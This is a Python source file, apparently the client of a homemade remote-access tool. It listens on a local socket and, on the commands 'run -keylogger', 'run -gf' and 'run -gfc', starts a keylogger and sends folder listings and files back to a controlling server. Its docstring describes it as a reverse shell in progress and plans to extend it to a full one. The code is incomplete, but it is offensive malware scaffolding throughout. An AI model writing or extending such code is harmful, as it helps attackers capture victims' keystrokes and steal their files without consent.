import socket
import userscanner
import keylogger
# TODO finish a client command structure
""" 
    This will await commands from the server something like a reverse shell
    When the server sends a show file request this will call the userscanner function
    We can extend this to full on reverse shell in the future

    ALSO:
        OPTIONAL: make a socket that sends the clients ip so the server will know hwo to connect
"""
while True:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as main_s:
            print("0: client.py started")
            main_s.bind(("127.0.0.1", 12345))
            print("1: bound the ip and port")
            main_s.listen(1)
            print("2: listening")
            conn, addr = main_s.accept()
            print(f"3: accepted {addr}")
            with conn:
                while True:
                    data = conn.recv(64).decode("utf-8") 
                    # The command section:
                    match data:
                        case "run -keylogger":
                            keylogger.start_keylogger()
                            print("Client Started the keylogger.")
                            data = " "

                        # To je kokotské implementovanie, ale nemusím 500 if dávať
                        case data if "run -gf" == data:
                            userscanner.start_FolderData(data)
                            print("Client Started the Folder Transfer.")
                            data = " "

                        case data if "run -gfc" in data:
                            userscanner.start_sendFiles(data)
                            print("Client Started the FileTransfer.")
                            data = " "

       
